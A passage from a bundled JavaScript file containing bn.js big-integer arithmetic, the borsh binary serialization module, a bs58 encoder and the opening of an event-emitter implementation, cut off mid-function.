          var res;
          if (a.cmpn(1) === 0) {
            res = x1;
          } else {
            res = x2;
          }
          if (res.cmpn(0) < 0) {
            res.iadd(p);
          }
          return res;
        };
        BN.prototype.gcd = function gcd(num) {
          if (this.isZero()) return num.abs();
          if (num.isZero()) return this.abs();
          var a = this.clone();
          var b = num.clone();
          a.negative = 0;
          b.negative = 0;
          for (var shift = 0; a.isEven() && b.isEven(); shift++) {
            a.iushrn(1);
            b.iushrn(1);
          }
          do {
            while (a.isEven()) {
              a.iushrn(1);
            }
            while (b.isEven()) {
              b.iushrn(1);
            }
            var r = a.cmp(b);
            if (r < 0) {
              var t = a;
              a = b;
              b = t;
            } else if (r === 0 || b.cmpn(1) === 0) {
              break;
            }
            a.isub(b);
          } while (true);
          return b.iushln(shift);
        };
        BN.prototype.invm = function invm(num) {
          return this.egcd(num).a.umod(num);
        };
        BN.prototype.isEven = function isEven() {
          return (this.words[0] & 1) === 0;
        };
        BN.prototype.isOdd = function isOdd() {
          return (this.words[0] & 1) === 1;
        };
        BN.prototype.andln = function andln(num) {
          return this.words[0] & num;
        };
        BN.prototype.bincn = function bincn(bit) {
          assert(typeof bit === 'number');
          var r = bit % 26;
          var s = (bit - r) / 26;
          var q = 1 << r;
          if (this.length <= s) {
            this._expand(s + 1);
            this.words[s] |= q;
            return this;
          }
          var carry = q;
          for (var i = s; carry !== 0 && i < this.length; i++) {
            var w = this.words[i] | 0;
            w += carry;
            carry = w >>> 26;
            w &= 0x3ffffff;
            this.words[i] = w;
          }
          if (carry !== 0) {
            this.words[i] = carry;
            this.length++;
          }
          return this;
        };
        BN.prototype.isZero = function isZero() {
          return this.length === 1 && this.words[0] === 0;
        };
        BN.prototype.cmpn = function cmpn(num) {
          var negative = num < 0;
          if (this.negative !== 0 && !negative) return -1;
          if (this.negative === 0 && negative) return 1;
          this._strip();
          var res;
          if (this.length > 1) {
            res = 1;
          } else {
            if (negative) {
              num = -num;
            }
            assert(num <= 0x3ffffff, 'Number is too big');
            var w = this.words[0] | 0;
            res = w === num ? 0 : w < num ? -1 : 1;
          }
          if (this.negative !== 0) return -res | 0;
          return res;
        };
        BN.prototype.cmp = function cmp(num) {
          if (this.negative !== 0 && num.negative === 0) return -1;
          if (this.negative === 0 && num.negative !== 0) return 1;
          var res = this.ucmp(num);
          if (this.negative !== 0) return -res | 0;
          return res;
        };
        BN.prototype.ucmp = function ucmp(num) {
          if (this.length > num.length) return 1;
          if (this.length < num.length) return -1;
          var res = 0;
          for (var i = this.length - 1; i >= 0; i--) {
            var a = this.words[i] | 0;
            var b = num.words[i] | 0;
            if (a === b) continue;
            if (a < b) {
              res = -1;
            } else if (a > b) {
              res = 1;
            }
            break;
          }
          return res;
        };
        BN.prototype.gtn = function gtn(num) {
          return this.cmpn(num) === 1;
        };
        BN.prototype.gt = function gt(num) {
          return this.cmp(num) === 1;
        };
        BN.prototype.gten = function gten(num) {
          return this.cmpn(num) >= 0;
        };
        BN.prototype.gte = function gte(num) {
          return this.cmp(num) >= 0;
        };
        BN.prototype.ltn = function ltn(num) {
          return this.cmpn(num) === -1;
        };
        BN.prototype.lt = function lt(num) {
          return this.cmp(num) === -1;
        };
        BN.prototype.lten = function lten(num) {
          return this.cmpn(num) <= 0;
        };
        BN.prototype.lte = function lte(num) {
          return this.cmp(num) <= 0;
        };
        BN.prototype.eqn = function eqn(num) {
          return this.cmpn(num) === 0;
        };
        BN.prototype.eq = function eq(num) {
          return this.cmp(num) === 0;
        };
        BN.red = function red(num) {
          return new Red(num);
        };
        BN.prototype.toRed = function toRed(ctx) {
          assert(!this.red, 'Already a number in reduction context');
          assert(this.negative === 0, 'red works only with positives');
          return ctx.convertTo(this)._forceRed(ctx);
        };
        BN.prototype.fromRed = function fromRed() {
          assert(this.red, 'fromRed works only with numbers in reduction context');
          return this.red.convertFrom(this);
        };
        BN.prototype._forceRed = function _forceRed(ctx) {
          this.red = ctx;
          return this;
        };
        BN.prototype.forceRed = function forceRed(ctx) {
          assert(!this.red, 'Already a number in reduction context');
          return this._forceRed(ctx);
        };
        BN.prototype.redAdd = function redAdd(num) {
          assert(this.red, 'redAdd works only with red numbers');
          return this.red.add(this, num);
        };
        BN.prototype.redIAdd = function redIAdd(num) {
          assert(this.red, 'redIAdd works only with red numbers');
          return this.red.iadd(this, num);
        };
        BN.prototype.redSub = function redSub(num) {
          assert(this.red, 'redSub works only with red numbers');
          return this.red.sub(this, num);
        };
        BN.prototype.redISub = function redISub(num) {
          assert(this.red, 'redISub works only with red numbers');
          return this.red.isub(this, num);
        };
        BN.prototype.redShl = function redShl(num) {
          assert(this.red, 'redShl works only with red numbers');
          return this.red.shl(this, num);
        };
        BN.prototype.redMul = function redMul(num) {
          assert(this.red, 'redMul works only with red numbers');
          this.red._verify2(this, num);
          return this.red.mul(this, num);
        };
        BN.prototype.redIMul = function redIMul(num) {
          assert(this.red, 'redMul works only with red numbers');
          this.red._verify2(this, num);
          return this.red.imul(this, num);
        };
        BN.prototype.redSqr = function redSqr() {
          assert(this.red, 'redSqr works only with red numbers');
          this.red._verify1(this);
          return this.red.sqr(this);
        };
        BN.prototype.redISqr = function redISqr() {
          assert(this.red, 'redISqr works only with red numbers');
          this.red._verify1(this);
          return this.red.isqr(this);
        };
        BN.prototype.redSqrt = function redSqrt() {
          assert(this.red, 'redSqrt works only with red numbers');
          this.red._verify1(this);
          return this.red.sqrt(this);
        };
        BN.prototype.redInvm = function redInvm() {
          assert(this.red, 'redInvm works only with red numbers');
          this.red._verify1(this);
          return this.red.invm(this);
        };
        BN.prototype.redNeg = function redNeg() {
          assert(this.red, 'redNeg works only with red numbers');
          this.red._verify1(this);
          return this.red.neg(this);
        };
        BN.prototype.redPow = function redPow(num) {
          assert(this.red && !num.red, 'redPow(normalNum)');
          this.red._verify1(this);
          return this.red.pow(this, num);
        };
        var primes = {
          k256: null,
          p224: null,
          p192: null,
          p25519: null
        };
        function MPrime(name, p) {
          this.name = name;
          this.p = new BN(p, 16);
          this.n = this.p.bitLength();
          this.k = new BN(1).iushln(this.n).isub(this.p);
          this.tmp = this._tmp();
        }
        MPrime.prototype._tmp = function _tmp() {
          var tmp = new BN(null);
          tmp.words = new Array(Math.ceil(this.n / 13));
          return tmp;
        };
        MPrime.prototype.ireduce = function ireduce(num) {
          var r = num;
          var rlen;
          do {
            this.split(r, this.tmp);
            r = this.imulK(r);
            r = r.iadd(this.tmp);
            rlen = r.bitLength();
          } while (rlen > this.n);
          var cmp = rlen < this.n ? -1 : r.ucmp(this.p);
          if (cmp === 0) {
            r.words[0] = 0;
            r.length = 1;
          } else if (cmp > 0) {
            r.isub(this.p);
          } else {
            if (r.strip !== undefined) {
              r.strip();
            } else {
              r._strip();
            }
          }
          return r;
        };
        MPrime.prototype.split = function split(input, out) {
          input.iushrn(this.n, 0, out);
        };
        MPrime.prototype.imulK = function imulK(num) {
          return num.imul(this.k);
        };
        function K256() {
          MPrime.call(this, 'k256', 'ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f');
        }
        inherits(K256, MPrime);
        K256.prototype.split = function split(input, output) {
          var mask = 0x3fffff;
          var outLen = Math.min(input.length, 9);
          for (var i = 0; i < outLen; i++) {
            output.words[i] = input.words[i];
          }
          output.length = outLen;
          if (input.length <= 9) {
            input.words[0] = 0;
            input.length = 1;
            return;
          }
          var prev = input.words[9];
          output.words[output.length++] = prev & mask;
          for (i = 10; i < input.length; i++) {
            var next = input.words[i] | 0;
            input.words[i - 10] = (next & mask) << 4 | prev >>> 22;
            prev = next;
          }
          prev >>>= 22;
          input.words[i - 10] = prev;
          if (prev === 0 && input.length > 10) {
            input.length -= 10;
          } else {
            input.length -= 9;
          }
        };
        K256.prototype.imulK = function imulK(num) {
          num.words[num.length] = 0;
          num.words[num.length + 1] = 0;
          num.length += 2;
          var lo = 0;
          for (var i = 0; i < num.length; i++) {
            var w = num.words[i] | 0;
            lo += w * 0x3d1;
            num.words[i] = lo & 0x3ffffff;
            lo = w * 0x40 + (lo / 0x4000000 | 0);
          }
          if (num.words[num.length - 1] === 0) {
            num.length--;
            if (num.words[num.length - 1] === 0) {
              num.length--;
            }
          }
          return num;
        };
        function P224() {
          MPrime.call(this, 'p224', 'ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001');
        }
        inherits(P224, MPrime);
        function P192() {
          MPrime.call(this, 'p192', 'ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff');
        }
        inherits(P192, MPrime);
        function P25519() {
          MPrime.call(this, '25519', '7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed');
        }
        inherits(P25519, MPrime);
        P25519.prototype.imulK = function imulK(num) {
          var carry = 0;
          for (var i = 0; i < num.length; i++) {
            var hi = (num.words[i] | 0) * 0x13 + carry;
            var lo = hi & 0x3ffffff;
            hi >>>= 26;
            num.words[i] = lo;
            carry = hi;
          }
          if (carry !== 0) {
            num.words[num.length++] = carry;
          }
          return num;
        };
        BN._prime = function prime(name) {
          if (primes[name]) return primes[name];
          var prime;
          if (name === 'k256') {
            prime = new K256();
          } else if (name === 'p224') {
            prime = new P224();
          } else if (name === 'p192') {
            prime = new P192();
          } else if (name === 'p25519') {
            prime = new P25519();
          } else {
            throw new Error('Unknown prime ' + name);
          }
          primes[name] = prime;
          return prime;
        };
        function Red(m) {
          if (typeof m === 'string') {
            var prime = BN._prime(m);
            this.m = prime.p;
            this.prime = prime;
          } else {
            assert(m.gtn(1), 'modulus must be greater than 1');
            this.m = m;
            this.prime = null;
          }
        }
        Red.prototype._verify1 = function _verify1(a) {
          assert(a.negative === 0, 'red works only with positives');
          assert(a.red, 'red works only with red numbers');
        };
        Red.prototype._verify2 = function _verify2(a, b) {
          assert((a.negative | b.negative) === 0, 'red works only with positives');
          assert(a.red && a.red === b.red, 'red works only with red numbers');
        };
        Red.prototype.imod = function imod(a) {
          if (this.prime) return this.prime.ireduce(a)._forceRed(this);
          move(a, a.umod(this.m)._forceRed(this));
          return a;
        };
        Red.prototype.neg = function neg(a) {
          if (a.isZero()) {
            return a.clone();
          }
          return this.m.sub(a)._forceRed(this);
        };
        Red.prototype.add = function add(a, b) {
          this._verify2(a, b);
          var res = a.add(b);
          if (res.cmp(this.m) >= 0) {
            res.isub(this.m);
          }
          return res._forceRed(this);
        };
        Red.prototype.iadd = function iadd(a, b) {
          this._verify2(a, b);
          var res = a.iadd(b);
          if (res.cmp(this.m) >= 0) {
            res.isub(this.m);
          }
          return res;
        };
        Red.prototype.sub = function sub(a, b) {
          this._verify2(a, b);
          var res = a.sub(b);
          if (res.cmpn(0) < 0) {
            res.iadd(this.m);
          }
          return res._forceRed(this);
        };
        Red.prototype.isub = function isub(a, b) {
          this._verify2(a, b);
          var res = a.isub(b);
          if (res.cmpn(0) < 0) {
            res.iadd(this.m);
          }
          return res;
        };
        Red.prototype.shl = function shl(a, num) {
          this._verify1(a);
          return this.imod(a.ushln(num));
        };
        Red.prototype.imul = function imul(a, b) {
          this._verify2(a, b);
          return this.imod(a.imul(b));
        };
        Red.prototype.mul = function mul(a, b) {
          this._verify2(a, b);
          return this.imod(a.mul(b));
        };
        Red.prototype.isqr = function isqr(a) {
          return this.imul(a, a.clone());
        };
        Red.prototype.sqr = function sqr(a) {
          return this.mul(a, a);
        };
        Red.prototype.sqrt = function sqrt(a) {
          if (a.isZero()) return a.clone();
          var mod3 = this.m.andln(3);
          assert(mod3 % 2 === 1);
          if (mod3 === 3) {
            var pow = this.m.add(new BN(1)).iushrn(2);
            return this.pow(a, pow);
          }
          var q = this.m.subn(1);
          var s = 0;
          while (!q.isZero() && q.andln(1) === 0) {
            s++;
            q.iushrn(1);
          }
          assert(!q.isZero());
          var one = new BN(1).toRed(this);
          var nOne = one.redNeg();
          var lpow = this.m.subn(1).iushrn(1);
          var z = this.m.bitLength();
          z = new BN(2 * z * z).toRed(this);
          while (this.pow(z, lpow).cmp(nOne) !== 0) {
            z.redIAdd(nOne);
          }
          var c = this.pow(z, q);
          var r = this.pow(a, q.addn(1).iushrn(1));
          var t = this.pow(a, q);
          var m = s;
          while (t.cmp(one) !== 0) {
            var tmp = t;
            for (var i = 0; tmp.cmp(one) !== 0; i++) {
              tmp = tmp.redSqr();
            }
            assert(i < m);
            var b = this.pow(c, new BN(1).iushln(m - i - 1));
            r = r.redMul(b);
            c = b.redSqr();
            t = t.redMul(c);
            m = i;
          }
          return r;
        };
        Red.prototype.invm = function invm(a) {
          var inv = a._invmp(this.m);
          if (inv.negative !== 0) {
            inv.negative = 0;
            return this.imod(inv).redNeg();
          } else {
            return this.imod(inv);
          }
        };
        Red.prototype.pow = function pow(a, num) {
          if (num.isZero()) return new BN(1).toRed(this);
          if (num.cmpn(1) === 0) return a.clone();
          var windowSize = 4;
          var wnd = new Array(1 << windowSize);
          wnd[0] = new BN(1).toRed(this);
          wnd[1] = a;
          for (var i = 2; i < wnd.length; i++) {
            wnd[i] = this.mul(wnd[i - 1], a);
          }
          var res = wnd[0];
          var current = 0;
          var currentLen = 0;
          var start = num.bitLength() % 26;
          if (start === 0) {
            start = 26;
          }
          for (i = num.length - 1; i >= 0; i--) {
            var word = num.words[i];
            for (var j = start - 1; j >= 0; j--) {
              var bit = word >> j & 1;
              if (res !== wnd[0]) {
                res = this.sqr(res);
              }
              if (bit === 0 && current === 0) {
                currentLen = 0;
                continue;
              }
              current <<= 1;
              current |= bit;
              currentLen++;
              if (currentLen !== windowSize && (i !== 0 || j !== 0)) continue;
              res = this.mul(res, wnd[current]);
              currentLen = 0;
              current = 0;
            }
            start = 26;
          }
          return res;
        };
        Red.prototype.convertTo = function convertTo(num) {
          var r = num.umod(this.m);
          return r === num ? r.clone() : r;
        };
        Red.prototype.convertFrom = function convertFrom(num) {
          var res = num.clone();
          res.red = null;
          return res;
        };
        BN.mont = function mont(num) {
          return new Mont(num);
        };
        function Mont(m) {
          Red.call(this, m);
          this.shift = this.m.bitLength();
          if (this.shift % 26 !== 0) {
            this.shift += 26 - this.shift % 26;
          }
          this.r = new BN(1).iushln(this.shift);
          this.r2 = this.imod(this.r.sqr());
          this.rinv = this.r._invmp(this.m);
          this.minv = this.rinv.mul(this.r).isubn(1).div(this.m);
          this.minv = this.minv.umod(this.r);
          this.minv = this.r.sub(this.minv);
        }
        inherits(Mont, Red);
        Mont.prototype.convertTo = function convertTo(num) {
          return this.imod(num.ushln(this.shift));
        };
        Mont.prototype.convertFrom = function convertFrom(num) {
          var r = this.imod(num.mul(this.rinv));
          r.red = null;
          return r;
        };
        Mont.prototype.imul = function imul(a, b) {
          if (a.isZero() || b.isZero()) {
            a.words[0] = 0;
            a.length = 1;
            return a;
          }
          var t = a.imul(b);
          var c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m);
          var u = t.isub(c).iushrn(this.shift);
          var res = u;
          if (u.cmp(this.m) >= 0) {
            res = u.isub(this.m);
          } else if (u.cmpn(0) < 0) {
            res = u.iadd(this.m);
          }
          return res._forceRed(this);
        };
        Mont.prototype.mul = function mul(a, b) {
          if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);
          var t = a.mul(b);
          var c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m);
          var u = t.isub(c).iushrn(this.shift);
          var res = u;
          if (u.cmp(this.m) >= 0) {
            res = u.isub(this.m);
          } else if (u.cmpn(0) < 0) {
            res = u.iadd(this.m);
          }
          return res._forceRed(this);
        };
        Mont.prototype.invm = function invm(a) {
          var res = this.imod(a._invmp(this.m).mul(this.r2));
          return res._forceRed(this);
        };
      })(typeof module === 'undefined' || module, this);
    }, {
      "buffer": 2
    }],
    52: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          var __createBinding = this && this.__createBinding || (Object.create ? function (o, m, k, k2) {
            if (k2 === undefined) k2 = k;
            Object.defineProperty(o, k2, {
              enumerable: true,
              get: function () {
                return m[k];
              }
            });
          } : function (o, m, k, k2) {
            if (k2 === undefined) k2 = k;
            o[k2] = m[k];
          });
          var __setModuleDefault = this && this.__setModuleDefault || (Object.create ? function (o, v) {
            Object.defineProperty(o, "default", {
              enumerable: true,
              value: v
            });
          } : function (o, v) {
            o["default"] = v;
          });
          var __decorate = this && this.__decorate || function (decorators, target, key, desc) {
            var c = arguments.length,
              r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc,
              d;
            if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
            return c > 3 && r && Object.defineProperty(target, key, r), r;
          };
          var __importStar = this && this.__importStar || function (mod) {
            if (mod && mod.__esModule) return mod;
            var result = {};
            if (mod != null) for (var k in mod) if (k !== "default" && Object.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
            __setModuleDefault(result, mod);
            return result;
          };
          var __importDefault = this && this.__importDefault || function (mod) {
            return mod && mod.__esModule ? mod : {
              "default": mod
            };
          };
          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.deserializeUnchecked = exports.deserialize = exports.serialize = exports.BinaryReader = exports.BinaryWriter = exports.BorshError = exports.baseDecode = exports.baseEncode = void 0;
          const bn_js_1 = __importDefault(require("bn.js"));
          const bs58_1 = __importDefault(require("bs58"));
          const encoding = __importStar(require("text-encoding-utf-8"));
          const ResolvedTextDecoder = typeof TextDecoder !== "function" ? encoding.TextDecoder : TextDecoder;
          const textDecoder = new ResolvedTextDecoder("utf-8", {
            fatal: true
          });
          function baseEncode(value) {
            if (typeof value === "string") {
              value = Buffer.from(value, "utf8");
            }
            return bs58_1.default.encode(Buffer.from(value));
          }
          exports.baseEncode = baseEncode;
          function baseDecode(value) {
            return Buffer.from(bs58_1.default.decode(value));
          }
          exports.baseDecode = baseDecode;
          const INITIAL_LENGTH = 1024;
          class BorshError extends Error {
            constructor(message) {
              super(message);
              this.fieldPath = [];
              this.originalMessage = message;
            }
            addToFieldPath(fieldName) {
              this.fieldPath.splice(0, 0, fieldName);
              this.message = this.originalMessage + ": " + this.fieldPath.join(".");
            }
          }
          exports.BorshError = BorshError;
          class BinaryWriter {
            constructor() {
              this.buf = Buffer.alloc(INITIAL_LENGTH);
              this.length = 0;
            }
            maybeResize() {
              if (this.buf.length < 16 + this.length) {
                this.buf = Buffer.concat([this.buf, Buffer.alloc(INITIAL_LENGTH)]);
              }
            }
            writeU8(value) {
              this.maybeResize();
              this.buf.writeUInt8(value, this.length);
              this.length += 1;
            }
            writeU16(value) {
              this.maybeResize();
              this.buf.writeUInt16LE(value, this.length);
              this.length += 2;
            }
            writeU32(value) {
              this.maybeResize();
              this.buf.writeUInt32LE(value, this.length);
              this.length += 4;
            }
            writeU64(value) {
              this.maybeResize();
              this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray("le", 8)));
            }
            writeU128(value) {
              this.maybeResize();
              this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray("le", 16)));
            }
            writeU256(value) {
              this.maybeResize();
              this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray("le", 32)));
            }
            writeU512(value) {
              this.maybeResize();
              this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray("le", 64)));
            }
            writeBuffer(buffer) {
              this.buf = Buffer.concat([Buffer.from(this.buf.subarray(0, this.length)), buffer, Buffer.alloc(INITIAL_LENGTH)]);
              this.length += buffer.length;
            }
            writeString(str) {
              this.maybeResize();
              const b = Buffer.from(str, "utf8");
              this.writeU32(b.length);
              this.writeBuffer(b);
            }
            writeFixedArray(array) {
              this.writeBuffer(Buffer.from(array));
            }
            writeArray(array, fn) {
              this.maybeResize();
              this.writeU32(array.length);
              for (const elem of array) {
                this.maybeResize();
                fn(elem);
              }
            }
            toArray() {
              return this.buf.subarray(0, this.length);
            }
          }
          exports.BinaryWriter = BinaryWriter;
          function handlingRangeError(target, propertyKey, propertyDescriptor) {
            const originalMethod = propertyDescriptor.value;
            propertyDescriptor.value = function (...args) {
              try {
                return originalMethod.apply(this, args);
              } catch (e) {
                if (e instanceof RangeError) {
                  const code = e.code;
                  if (["ERR_BUFFER_OUT_OF_BOUNDS", "ERR_OUT_OF_RANGE"].indexOf(code) >= 0) {
                    throw new BorshError("Reached the end of buffer when deserializing");
                  }
                }
                throw e;
              }
            };
          }
          class BinaryReader {
            constructor(buf) {
              this.buf = buf;
              this.offset = 0;
            }
            readU8() {
              const value = this.buf.readUInt8(this.offset);
              this.offset += 1;
              return value;
            }
            readU16() {
              const value = this.buf.readUInt16LE(this.offset);
              this.offset += 2;
              return value;
            }
            readU32() {
              const value = this.buf.readUInt32LE(this.offset);
              this.offset += 4;
              return value;
            }
            readU64() {
              const buf = this.readBuffer(8);
              return new bn_js_1.default(buf, "le");
            }
            readU128() {
              const buf = this.readBuffer(16);
              return new bn_js_1.default(buf, "le");
            }
            readU256() {
              const buf = this.readBuffer(32);
              return new bn_js_1.default(buf, "le");
            }
            readU512() {
              const buf = this.readBuffer(64);
              return new bn_js_1.default(buf, "le");
            }
            readBuffer(len) {
              if (this.offset + len > this.buf.length) {
                throw new BorshError(`Expected buffer length ${len} isn't within bounds`);
              }
              const result = this.buf.slice(this.offset, this.offset + len);
              this.offset += len;
              return result;
            }
            readString() {
              const len = this.readU32();
              const buf = this.readBuffer(len);
              try {
                return textDecoder.decode(buf);
              } catch (e) {
                throw new BorshError(`Error decoding UTF-8 string: ${e}`);
              }
            }
            readFixedArray(len) {
              return new Uint8Array(this.readBuffer(len));
            }
            readArray(fn) {
              const len = this.readU32();
              const result = Array();
              for (let i = 0; i < len; ++i) {
                result.push(fn());
              }
              return result;
            }
          }
          __decorate([handlingRangeError], BinaryReader.prototype, "readU8", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readU16", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readU32", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readU64", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readU128", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readU256", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readU512", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readString", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readFixedArray", null);
          __decorate([handlingRangeError], BinaryReader.prototype, "readArray", null);
          exports.BinaryReader = BinaryReader;
          function capitalizeFirstLetter(string) {
            return string.charAt(0).toUpperCase() + string.slice(1);
          }
          function serializeField(schema, fieldName, value, fieldType, writer) {
            try {
              if (typeof fieldType === "string") {
                writer[`write${capitalizeFirstLetter(fieldType)}`](value);
              } else if (fieldType instanceof Array) {
                if (typeof fieldType[0] === "number") {
                  if (value.length !== fieldType[0]) {
                    throw new BorshError(`Expecting byte array of length ${fieldType[0]}, but got ${value.length} bytes`);
                  }
                  writer.writeFixedArray(value);
                } else if (fieldType.length === 2 && typeof fieldType[1] === "number") {
                  if (value.length !== fieldType[1]) {
                    throw new BorshError(`Expecting byte array of length ${fieldType[1]}, but got ${value.length} bytes`);
                  }
                  for (let i = 0; i < fieldType[1]; i++) {
                    serializeField(schema, null, value[i], fieldType[0], writer);
                  }
                } else {
                  writer.writeArray(value, item => {
                    serializeField(schema, fieldName, item, fieldType[0], writer);
                  });
                }
              } else if (fieldType.kind !== undefined) {
                switch (fieldType.kind) {
                  case "option":
                    {
                      if (value === null || value === undefined) {
                        writer.writeU8(0);
                      } else {
                        writer.writeU8(1);
                        serializeField(schema, fieldName, value, fieldType.type, writer);
                      }
                      break;
                    }
                  case "map":
                    {
                      writer.writeU32(value.size);
                      value.forEach((val, key) => {
                        serializeField(schema, fieldName, key, fieldType.key, writer);
                        serializeField(schema, fieldName, val, fieldType.value, writer);
                      });
                      break;
                    }
                  default:
                    throw new BorshError(`FieldType ${fieldType} unrecognized`);
                }
              } else {
                serializeStruct(schema, value, writer);
              }
            } catch (error) {
              if (error instanceof BorshError) {
                error.addToFieldPath(fieldName);
              }
              throw error;
            }
          }
          function serializeStruct(schema, obj, writer) {
            if (typeof obj.borshSerialize === "function") {
              obj.borshSerialize(writer);
              return;
            }
            const structSchema = schema.get(obj.constructor);
            if (!structSchema) {
              throw new BorshError(`Class ${obj.constructor.name} is missing in schema`);
            }
            if (structSchema.kind === "struct") {
              structSchema.fields.map(([fieldName, fieldType]) => {
                serializeField(schema, fieldName, obj[fieldName], fieldType, writer);
              });
            } else if (structSchema.kind === "enum") {
              const name = obj[structSchema.field];
              for (let idx = 0; idx < structSchema.values.length; ++idx) {
                const [fieldName, fieldType] = structSchema.values[idx];
                if (fieldName === name) {
                  writer.writeU8(idx);
                  serializeField(schema, fieldName, obj[fieldName], fieldType, writer);
                  break;
                }
              }
            } else {
              throw new BorshError(`Unexpected schema kind: ${structSchema.kind} for ${obj.constructor.name}`);
            }
          }
          function serialize(schema, obj, Writer = BinaryWriter) {
            const writer = new Writer();
            serializeStruct(schema, obj, writer);
            return writer.toArray();
          }
          exports.serialize = serialize;
          function deserializeField(schema, fieldName, fieldType, reader) {
            try {
              if (typeof fieldType === "string") {
                return reader[`read${capitalizeFirstLetter(fieldType)}`]();
              }
              if (fieldType instanceof Array) {
                if (typeof fieldType[0] === "number") {
                  return reader.readFixedArray(fieldType[0]);
                } else if (typeof fieldType[1] === "number") {
                  const arr = [];
                  for (let i = 0; i < fieldType[1]; i++) {
                    arr.push(deserializeField(schema, null, fieldType[0], reader));
                  }
                  return arr;
                } else {
                  return reader.readArray(() => deserializeField(schema, fieldName, fieldType[0], reader));
                }
              }
              if (fieldType.kind === "option") {
                const option = reader.readU8();
                if (option) {
                  return deserializeField(schema, fieldName, fieldType.type, reader);
                }
                return undefined;
              }
              if (fieldType.kind === "map") {
                let map = new Map();
                const length = reader.readU32();
                for (let i = 0; i < length; i++) {
                  const key = deserializeField(schema, fieldName, fieldType.key, reader);
                  const val = deserializeField(schema, fieldName, fieldType.value, reader);
                  map.set(key, val);
                }
                return map;
              }
              return deserializeStruct(schema, fieldType, reader);
            } catch (error) {
              if (error instanceof BorshError) {
                error.addToFieldPath(fieldName);
              }
              throw error;
            }
          }
          function deserializeStruct(schema, classType, reader) {
            if (typeof classType.borshDeserialize === "function") {
              return classType.borshDeserialize(reader);
            }
            const structSchema = schema.get(classType);
            if (!structSchema) {
              throw new BorshError(`Class ${classType.name} is missing in schema`);
            }
            if (structSchema.kind === "struct") {
              const result = {};
              for (const [fieldName, fieldType] of schema.get(classType).fields) {
                result[fieldName] = deserializeField(schema, fieldName, fieldType, reader);
              }
              return new classType(result);
            }
            if (structSchema.kind === "enum") {
              const idx = reader.readU8();
              if (idx >= structSchema.values.length) {
                throw new BorshError(`Enum index: ${idx} is out of range`);
              }
              const [fieldName, fieldType] = structSchema.values[idx];
              const fieldValue = deserializeField(schema, fieldName, fieldType, reader);
              return new classType({
                [fieldName]: fieldValue
              });
            }
            throw new BorshError(`Unexpected schema kind: ${structSchema.kind} for ${classType.constructor.name}`);
          }
          function deserialize(schema, classType, buffer, Reader = BinaryReader) {
            const reader = new Reader(buffer);
            const result = deserializeStruct(schema, classType, reader);
            if (reader.offset < buffer.length) {
              throw new BorshError(`Unexpected ${buffer.length - reader.offset} bytes after deserialized data`);
            }
            return result;
          }
          exports.deserialize = deserialize;
          function deserializeUnchecked(schema, classType, buffer, Reader = BinaryReader) {
            const reader = new Reader(buffer);
            return deserializeStruct(schema, classType, reader);
          }
          exports.deserializeUnchecked = deserializeUnchecked;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "bn.js": 51,
      "bs58": 53,
      "buffer": 3,
      "text-encoding-utf-8": 62
    }],
    53: [function (require, module, exports) {
      var basex = require('base-x');
      var ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
      module.exports = basex(ALPHABET);
    }, {
      "base-x": 49
    }],
    54: [function (require, module, exports) {
      'use strict';

      var has = Object.prototype.hasOwnProperty,
        prefix = '~';
      function Events() {}
      if (Object.create) {
        Events.prototype = Object.create(null);
        if (!new Events().__proto__) prefix = false;
      }
      function EE(fn, context, once) {
        this.fn = fn;
        this.context = context;
        this.once = once || false;
      }
      function addListener(emitter, event, fn, context, once) {
        if (typeof fn !== 'function') {
          throw new TypeError('The listener must be a function');
        }
        var listener = new EE(fn, context || emitter, once),
          evt = prefix ? prefix + event : event;
        if (!emitter._events[evt]) emitter._events[evt] = listener, emitter._eventsCount++;else if (!emitter._events[evt].fn) emitter._events[evt].push(listener);else emitter._events[evt] = [emitter._events[evt], listener];
        return emitter;
      }
      function clearEvent(emitter, evt) {
        if (--emitter._eventsCount === 0) emitter._events = new Events();else delete emitter._events[evt];
      }
      function EventEmitter() {
        this._events = new Events();
        this._eventsCount = 0;
      }
      EventEmitter.prototype.eventNames = function eventNames() {
        var names = [],
          events,
          name;
        if (this._eventsCount === 0) return names;
        for (name in events = this._events) {
          if (has.call(events, name)) names.push(prefix ? name.slice(1) : name);
        }
        if (Object.getOwnPropertySymbols) {
          return names.concat(Object.getOwnPropertySymbols(events));
        }
        return names;
      };
      EventEmitter.prototype.listeners = function listeners(event) {
        var evt = prefix ? prefix + event : event,
          handlers = this._events[evt];
        if (!handlers) return [];
        if (handlers.fn) return [handlers.fn];
        for (var i = 0, l = handlers.length, ee = new Array(l); i < l; i++) {
          ee[i] = handlers[i].fn;
        }
        return ee;
      };
      EventEmitter.prototype.listenerCount = function listenerCount(event) {
        var evt = prefix ? prefix + event : event,
          listeners = this._events[evt];
        if (!listeners) return 0;
        if (listeners.fn) return 1;
        return listeners.length;
      };
      EventEmitter.prototype.emit = function emit(event, a1, a2, a3, a4, a5) {
